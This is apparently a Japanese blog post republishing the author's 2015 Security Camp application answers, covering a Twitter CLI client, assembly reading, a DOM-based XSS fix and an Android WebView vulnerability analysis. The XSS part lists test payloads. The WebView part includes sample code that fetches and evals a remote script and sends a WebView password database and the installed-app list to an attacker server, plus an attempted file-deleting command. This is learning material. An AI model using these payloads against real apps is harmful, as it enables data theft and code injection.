+++
title = "セキュリティキャンプ 2015 応募用紙"
date = "2015-05-06"
[extra]
toc = true
+++

## 概要

問題自体は [http://www.ipa.go.jp/files/000045804.txt](http://www.ipa.go.jp/files/000045804.txt) を参考にして下さい。
問題の番号は残しましたが、問題の本文は含まれていないので上記の URL と照らし合わせながら見ていただきたいです。

装飾などが多少変わっていますが、回答の本文は公開できない部分は無いのでそのままです。

## 共通問題 1

### 応募した理由

正直に書くと主に 2 つの理由があります。

1 つ目は技術力のある人が集まっている場所で学習をすることによって自分の技術力を高めたいという点があります。
やはり自分 1 人で本を読んだりするよりは、ある程度の他人と意見交換する機会や実践する機会があった方が技術力を高められると思うので、それを期待しているということでもあります。
そのような現実的な点を除いても、同年代の高い技術力を持った人と接するのはモチベーショの向上になりますし、やはり技術力の向上に役に立つと思います。

2 つ目は、この問題を解く過程で知識を得ること期待していたという点や、選考を通過できるかどうか自分を試したいという意図があったことなど、問題自体にも興味がありました。
選択問題をひと通り解いた今としては、生涯やらないのでは無いかと思っていたアセンブラに触れる機会となったり、新しい脆弱性の存在を知れたり、実際に知識を得ることが出来ました。

その他、些細な理由としてはクラス制からトラック制に応募用紙も変わって個人的には問題用紙は解きやすくなったと感じていて、これなら自分でも出来ると思ったことや、来年からは学生ではなくなってしまうので最後のチャンスになんとしてでも参加したいと思った点などがあります。

### 何に役立てたいか

私はセキュリティにも興味がありますが、基本的には自分はプログラマだと認識しています。
なので、自分らが作るソフトウェアにセキュリティ上の問題を発生させないために、このキャンプで知識を身につけたいと思っています。

また、言語処理系や開発環境自体などの開発に特に興味があり、それらでセキュリティ的に問題のあるソースコードに対策できないかと思っています。
例えば Android Studio はセキュリティ的に問題のあるメソッドを呼び出した際には警告を表示してくれます。
このような機能を自分で作った言語に入れてみるのも面白そうではないかと考えています。
他にも PHP での htmlspecialcharacters や JavaScript での innerHTML などが何の警告も無く使えることに疑問を持っています。
それらの API の使用に警告を出すようにメジャーな処理系を変更することは難しいかもしれませんが、そのようなトランスパイラを開発することは現実的で有意義に思えます。
そういった機能を正しく実装することにこのキャンプを役立てられるのではないかと考えます。

他にもセキュリティ的な観点を除いてもアプリケーションを開発する際に役に立つ講義があるように見えますし、それらを受講して開発者としての成長に役立てたいとも思います

## 共通問題 2

在籍している学校の進級制作で作られた Web アプリにユーザのパスワードが平文でネットワークを流れる脆弱性があったことが最も印象に残っています。
印象に残っている理由を一言で言うと、自分が加害者として扱われる可能性のある初めての事案だからです。
詳細な話を以下に示します。
このシステムの制作には、静的なページを作るのに私も参加していました。
静的なページなので脆弱性があるコードには一切触れていないが、製作者として私の名前も載っています。
これを問題視していて私が脆弱性を作ったわけではないにも関わらず、私も加害者として扱われるだろうという点を懸念しています。
この段階でプログラマである以上、悪意はなくとも安全なアプリケーションを作る責任があると身を持って体験しました。

プログラマとして生きていく上で、加害者にならないためにも、同僚を加害者にしないためにも安全なアプリケーションを作る義務があるので、
その義務を果たすためにセキュリティの知識を得る必要性があると感じています。

## 共通問題 3

<http://lambdasawa.github.io/>
このサイトに私が作ったものの簡単な紹介や GitHub と技術ブログへのリンクがあります。

まず、私の持っている技術力の説明です。

Lisp インタプリタや CUI Twitter クライアントの開発を通じて基本的なプログラミングの能力を身につけました。
具体的には Ruby(Ruby on Rails は含まない) と Scala でのプログラミングが出来ます。

- <http://github.com/lambdasawa/liru>
- <http://github.com/lambdasawa/ittc>

上記のリポジトリがそれらのソースコードとなっています。
他にも JavaScript, Java, C なども基本的な点は理解しています。
読むことは特に問題なく出来ると思いますが、ドキュメントを見ずにスラスラとコードを書くことは難しいです。

これらの開発も含めて Linux をゲーム以外のほぼ全ての目的に使用しているので、これらの操作については問題ありません。
特に Lisp インタプリタの開発はドキュメントの参照以外をほぼ全て CLI で完結しています。

また、高校生の頃から競技プログラミングに参加しているのでアルゴリズムの基本的な知識もあります。
Codeforces や TopCoder はしていないのですが、目安としてはパソコン甲子園の本戦に出場しました。

ネットワーク、セキュリティに関しての基礎的な知識は情報セキュリティスペシャリスト試験を通じて身につけました。
その他のコンピュータの基礎的な知識を応用情報技術者試験などを通じて身につけました。

次に、興味や熱意についてアピールさせていただきたいと思います。

特に興味がある科目としては <https://www.ipa.go.jp/jinzai/camp/2015/zenkoku2015_truckA.html#trk5a> と <https://www.ipa.go.jp/jinzai/camp/2015/zenkoku2015_truckA.html#trk13&14a> です。

前者に関して興味を持った理由を書きます。
まず私がもっとも興味を持っているものは言語処理系です。
なので AltJS のことなどを考えると恐らく私がセキュリティ界隈にコードを提供することになったらこの方面からになると思います。
そういう意味でコンピュータが生成した JavaScript とどう向き合っていくかという問題に興味があります。

後者に関しては前述しましたが、自分に関連のある Web アプリに脆弱性があったことが今でもショックです。
そんなショックをもう 2 度と受けたくないというのも興味がある理由の 1 つです。
また、PHP が htmlspecialchars をつけるとエスケープされる、というような仕様も疑問です。
むしろデフォルトでエスケープされるようにして rowhtml のような名前のエスケープをしない関数を作るほうが良いのではないかと思います。
対して、Play Framework という Web アプリケーションフレーム でデフォルトに採用さている Twirl というテンプレートエンジンはそのようになっています。
<http://www.tokumaru.org/d/20090930.html> や <https://github.com/playframework/twirl/commits/master?page=5> を参考にすると、
htmlspecialchars が追加されたのが 1998/06/06 で Twirl の最初のコミットが 2013/08/12 です。
言語処理系に興味がある私としてはフレームワークも言語の一部であるという主張を踏まえると、興味深く思います。

また、普段の私は本や Web ページを読んで学習していることがほとんどです。
ところが、 <https://www.ipa.go.jp/jinzai/camp/2015/zenkoku2015_faq.html#section7> を読んだところ、
手を動かせる人、周知する努力を出来る人を大切にしている、という記述を見つけました。
また、今までそれらをしていなかった人は今がチャンスだともあります。
なので現在は応募用紙を書く過程で手を動かした形跡を残し、学んだこと周知させるという目的でブログを書いています。
上記にもありますが、この応募用紙を書いている現在は非公開ですが、応募期間が終了したら公開します。

ここで、上記を踏まえると <https://www.ipa.go.jp/jinzai/camp/2015/zenkoku2015_faq.html> の 8 番や 14 番の条件を満たしているので、
大丈夫で望ましい応募者だと言えます。

熱意というのは口ではなんとも言えるもので手を動かした量が実証するものだと思います。
なのでぜひ応募用紙やブログなどから判断していただきたいと思います。

## 選択問題 3

### どのようなソフトウェアであるかを教えてください

コマンドラインで Twitter を行うための CLI アプリケーションです。
どんな機能があるかは <http://github.com/lambdasawa/ittc> の README に記載されています。
基本的な機能以外では正規表現を登録して、その正規表現にマッチするツイートを表示しないようにする機能があります。

### 何の目的のためにそれを作ろうと思ったのか、理由を教えてください

自分にとって満足する CLI の Twitter クライアントを見つけられなかったので作りました。
具体的にはインタラクティブな操作が可能であったり、ユーザ ID などの補完をする操作が出来ないことが不満でした。

### 開発するにあたって工夫したところを教えてください

CLI でありながらも使い勝手の良さを実現するための細かい機能がいくつかあります。
(2) で書いた不満点はもちろん解消されています。
ツイートの ID を指定する際に連番だと入力が面倒くさいので、ツイート ID はそのハッシュ値を代わりに扱うようにしています。
また、補完に関しては途中までタイプしたものをタブキーで補完するのはもちろん、上下キーで履歴を遡ることもできます。
加えて、長いコマンドを打ちたくない人のためにサブコマンドのエイリアスを設定できます。

### 新たな課題、今後勉強してみたいと思っている内容を書いてください

テストが書かれていないので、開発が停滞しています。
なので、テストの追加や、テストをしやすい設計に変更することが新たな課題です。
現在はツイート ID のハッシュ値を利用している都合で、本来のツイート ID とそのハッシュ値の対応をローカルの DB に保存しています。
Base64 などを扱って、ローカルに DB を持たずにハッシュ化ではなく可逆な処理で入力しやすい ID を生成したいです。
また、保持しているデータを現状は H2 Database で保存しているのでが、CLI で扱える簡単なテキストファイルで保存するようにしたいです。
また、Twitter の API を叩くライブラリと CLI での補完を実現するライブラリの 2 つに不満点があるので、それを解消することも課題と言えるかもしれません。
具体的には前者は一部に指定できないパラメータがある点、後者は全角文字列を入力する際に BS や十字キーを使うとカーソルがあらぬ方向に飛んでいくことなどが不満です。

今後、勉強してみたい内容としてはいわゆる関数プログラミングと OAuth などの認証です。
ここでいう関数プログラミングとは副作用の少ないコードという程度の意味を指します。
現在は Scala で開発していて Java のライブラリを使っているのですが、せっかく Scala のような簡潔な記述が出来る言語を使っても、ライブラリがその習慣に対応していないため完結な記述が出来ない点が不満です。
それらを改善するためにラッパーを作ることになりますが、関数プログラミングを重視しているユーザからも扱い易い API を作りたいので、関数プログラミングを勉強したいという意図があります。
また Twitter の API を叩くライブラリに関しては、1 から自分で作ることも検討しているのですが、ユーザの認証の段階でセキュリティ的な問題を起こしたくないので、OAuth の体系的な知識が必要ではないかと感じています。

## 選択問題 5 　

### (1)

array に配列を渡した場合、先頭から n 個目の要素に n-1 の倍数が代入される。
配列の要素数より大きい数の n を渡した場合は segmentation fault になる可能性がある。

```c
void main() {
  int as[] = { 1, 1, 2, 3, 5 };
  int n = 100;
  function(as, n);
}
```

### (2)

#### 0 ~ 1

スタックに %esi と %ebx の値をプッシュしている。
これらが何を指すのかは分からない。

#### 2 ~ 6

引数をレジスタにコピーしている。
%ebx に `*array` を、 %ecx に n をコピーしている。

#### a ~ c

i < n をチェックしている。
結果によって for の終わりにジャンプするように見える。
しかし、これは元のソースコードを見ての推測であって、アセンブラ自体は理解できない。
アセンブラを見ると、 %ecx <= %ecx なら 0x26 の位置にジャンプするのではないかと推測している。
この 2 つの推測が両立するとは思えず、あまり自身がない。

#### e

%esi に %ecx をコピーしている。
%ecx には n が記憶されているので、 %esi には n が入っていることになる。

#### 10 ~ 15

%edx と %eax を 0 で初期化している。
%edx は、i \* n を計算するために、必要とされる。
%eax は i として扱われる。

#### 1a ~ 24

ここが for 文の繰り返される部分となる。
1a の行で配列に事前に保存した %edx を経由して i _n を保存している。
1d の行では i++ を実行している。
20 の行では i_ n を %edx に保存している。
22 ~ 24 の行によって比較、ジャンプが行われる。

#### 26 ~ 27

最初にスタックに詰んだ、 %esi と %ebx の値をポップしている。
やはり、これらが何を指すのかは分からない。

#### 28

関数を終了している。

## 選択問題 9 　

Dom Based XSS の脆弱性があり、被害者の閲覧しているページが偽物のフォームに書き換えられ不正に個人情報を奪われたり、
cookie に保存されているセッション ID が盗まれてなりすましを行われる、などの問題が発生する可能性があります。

まず innerHTML は任意のタグを埋め込めるので危険です。
基本的に文字列を直接操作するより DOM を操作する API を活用していくべきです。
この例だと createElement, createTextNode, appendChild, setAttribute などが該当します。
なので URL の部分のみ createElement で a タグを作り、他の部分は createTextNode などを使ってをそれを appendChild などで追加していく方針に修正します。
これで a タグ以外のタグは注入されないことになります。

次に JavaScript を擬似プロトコルなどで a タグの href 属性に注入される危険性に対処します。
今回のケースでは 2 種類の対処法があります。
どちらの方法でも対処出来ますが、両方やっても問題はないので両方をやるのが無難だと思います。
1 つ目は正規表現の 1 つ目のグループをプロトコルを指定するように修正することで対処できます。
これは特に解説する必要はないと思います。
2 つ目は正規表現の 3 つ目のグループに U+2028 と U+2029 を追加することによっても回避することが出来ます。
以下で U+2028 と表記した際には U+2029 についても同様です。
U+2028 をエスケープする理由について、攻撃者の観点から考察します。
まず攻撃者は javascript:alert(1) というコードを注入しようと思いますが、これでは正規表現にマッチしません。
なので javascript://alert(1) というコードを注入しようとします。
しかしこれは // でコメントすることになるので alert(1) は実行されません。
コメントアウトを解除しようにも正規表現の 3 つ目のグループで `\r\n` が指定されているため改行文字は弾かれてしまいます。
なので JavaScript で改行として扱わる、かつ正規表現の 3 つ目のグループでマッチしない U+2028 を // の直後に挿入します。
そうすることでコメントアウトを回避して JavaScript のコードを注入することが出来ます。
この攻撃を回避するために U+2028 を受け付けてはいけません。

次に a タグに href 以外の属性が設定されて JavaScript が実行される危険性について対処します。
これも基本的には setAttribute を使うべきです。
あるいは href 属性をダブルクオーテーションで括り、属性内に引用符が含まれないすることが必要です。
また、その対策を破られないように属性内で特殊な意味を持つ文字をエスケープすることによって対処できます。
主に " と & をエスケープする必要があります。
ただ、IE ではバッククオートが引用符として扱われるケースがあるので、バッククオートも 3 つ目の正規表現に追加するべきかと思います。
しかし、今回のケースでは正規表現にマッチしないので属性に不正な値が入ることはありません。

以上を踏まえて、実際に修正したコードは以下のようになります。

```javascript
function makeUrlLinks(text) {
  var output = document.getElementById("output");
  output.innerHTML = "";
  // split でマッチする部分としない部分にするために全体を () で括っている。
  var regexp = /(https?:\/\/[\w\.\-]+\/[^\r\n \t\u2028\u2029<>"'`]*)/g;
  var inners = text.split(regexp);
  for (var inner of inners) {
    if (regexp.test(inner)) {
      var a = document.createElement("a");
      a.setAttribute("href", inner);
      var ai = document.createTextNode(inner);
      a.appendChild(ai);
      output.appendChild(a);
    } else {
      var t = document.createTextNode(inner);
      output.appendChild(t);
    }
  }
}
```

上記の修正で以下のような文字列を引数に渡しても問題が alert されないことを Firefox 38 で確認しました。

1. `<iframe src='http://example.com' onload='alert(1);'></iframe>`
2. `<img src='x' onerror='alert(2);'></img>`
3. `<script defer='defer'>alert(3);</script> // IE 以外では問題なし`
4. `javascript://something-string/ alert(4); // 0x2028 が混じっている`

## 選択問題 10 　

### JavaScript での文字列の難読化の手法

主に難読化された JavaScript の読み方について書こうと思います。

まず文字種を見て有名なエンコーダを使ったかどうかを判断します。
恐らく有名なエンコーダであれば、デコーダを誰かが開発している可能性があり、それを使うだけで済みます。
具体的には下記のようなエンコーダとデコーダを発見しました。

- jjencode
  - <http://utf-8.jp/public/jjencode.html>
  - <https://github.com/jacobsoo/Decoder-JJEncode>
  - <http://pferrie2.tripod.com/papers/jjencode.pdf>
- aaencode
  - <http://utf-8.jp/public/aaencode.html>
  - <http://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html>
- JSFuck
  - <http://patriciopalladino.com/files/hieroglyphy/>
  - <http://jsfuckdecoder.getenjoyment.net/test.html>

また、minify されたコードであればツールを使用し整形を行います。
例えば Firefox では Developer Tools を起動し Debugger タブに移動し {} と書かれたボタンを押すことで、
現在のページに含まれる JS を整形できます。

文字列、数値、論理値を素直にリテラルを使わずに書く方法が多数あり、それらを置換していくことも必要になるかと思います。
それらについてまとまっている情報として以下のリンクを参照しつつ分かりやすいリテラルに単純に置換できると思います。

- <http://utf-8.jp/public/20101218/jsobfus.pptx>
- <https://github.com/aemkei/jsfuck/blob/master/jsfuck.js>

また、 eval に関してもまわりくどい呼び出し方が多数あり置換する必要があるように思えます。

- <http://www.netagent-blog.jp/archives/51739962.html>

これらは静的にソースコードを解析する例ですが、動的に解析する方法についても調べてみました。
例えば下記のようなコードによって eval の呼び出しを捕捉できます。

```javascript
var f = eval;
eval = function(source) {
  console.log(this, arguments);
  return f.apply(this, arguments);
};
```

これによって JavaScript のソースコードを文字列で組み立てながら eval するようなものを簡単に解析できます。
これはもちろん eval 以外にも応用することが可能だと思います。

## 選択問題 14 　

主に

- 外部からスクリプトを注入できることと、
- そのスクリプトがインストール済みのアプリ一覧などのブラウザの外の情報にこのアプリの権限でアクセスできる

という問題があります。
これは主に `webview.getSettings().setJavaScriptEnabled(true);` というコードと、
CVE-2012-6636 の行によって発生します。

スクリプトを注入する方法について書きます。

まず、 CVE-2014-3500 の行を見ると外部からインテントで任意のページを渡せることが分かります。
CVE-2012-6637 の行でオリジンをチェックしているように見えますが正規表現にミスがあるため、
クエリストリングなどに ALLOW_ORIGIN を追加すれば特に問題はありません。

```java
// 外部のアプリからインテントを発行して任意のサイトにアクセスさせる例。
final String ACTION_LOAD = "jp.example.app.action.LOAD";
final String ALLOW_ORIGIN = "http://www.ipa.go.jp";
final String MALCIOUS_SITE = "http://example.com"
final Intent intent = new Intent(ACTION_LOAD);
intent.putExtra("url", MALCIOUS_SITE + "?" + ALLOW_ORIGIN);
sendBroadcast(intent);
```

また、 CVE-2014-1883 の行に関してですが、 iframe や XMLHttpRequest は shouldOverrideUrlLoading を経由しないので、
そもそもオリジンをチェックしていないことが分かります。
ALLOW_ORIGIN 内に iframe があり、iframe からリンクを辿れる場所に任意のスクリプト設置できるとすろと、
そこに悪意のあるスクリプトを設置し、待ち伏せすることが出来そうです。
XMLHttpRequest に関しては、スクリプトを任意のサーバに設置し、
XMLHttpRequest で取得し eval することなどが出来ます。

```javascript
// http://example.com に悪意のあるスクリプトが設置してあると仮定して、
// 外部のスクリプトを eval する例。
var malciousSite = "http://example.com";
var xhr = new XMLHttpRequest();
xhr.open("GET", malciousSite, false);
xhr.send(null);
var script = xhr.responseText;
eval(script);
```

加えて、 CVE-2014-5991 の行によって SSL のエラーを無視しているため DNS 偽装と正しくない証明書などを使って、
ALLOW_ORIGIN になりすますことも可能です。

注入したスクリプトによってどんな被害が生じるかについて書きます。
基本的に JavaScript で出来ることは何でも出来ます。
JavaScript だけでは出来ないことの例としてローカルのファイルにアクセスすることがありますが、
CVE-2012-4009 の行によってローカルのファイルにこのアプリの権限でアクセスできます。
よって、意図せぬファイルが外部のサーバに送信される可能性などがあります。
下記でいくつかコードの例を示すが、 `sendDataToServerOfAtaccker` という関数は、
文字列を攻撃者のサーバに送信する関数とします。
ここで、 Same Origin Policy の影響を受けるので、スクリプトはローカルか攻撃者のサーバにあるものとします。

```javascript
// このアプリのパッケージが com.example.lambdasawa.seccamp だと仮定して、
// /data/data/com.example.lambdasawa.seccamp/databases/webview.db を外部のサーバに送信する例。
// このファイルには WebView で保存したパスワードなどが平文で保存されている。
var file =
  "file:///data/data/com.example.lambdasawa.seccamp/databases/webview.db";
var xhr = new XMLHttpRequest();
xhr.open("GET", file, false);
xhr.send(null);
var cache = xhr.responseText;
sendDataToServerOfAtaccker(cache);
```

また、下記のような JavaScript を実行させることで、インストール済みのアプリ一覧を漏洩させることが出来ます。

```javascript
var ia = android.getPackageManager().getInstalledApplications(9344);
var apps = [];
for (var x = 0; x < ia.size(); x++) {
  sendDataToServerOfAtaccker(ia.get(x));
}
```

他にもリフレクションを経由して java.lang.Runtime を取得し、
exec メソッドを呼び出すことで OS コマンドインジェクションが出来るのではないかと考えました。
しかし、下記のコードでは上手くいかず、実際にコマンドを注入させる方法は分かりませんでした。

```javascript
var command =
  "rm /data/data/com.example.lambdasawa.seccamp/files/critical_data";
var class_ = android.getClass();
var runtimeClass = class_.forName("java.lang.Runtime");
var runtime = runtimeClass.getRuntime();
runtime.exec(command, null, null);
```
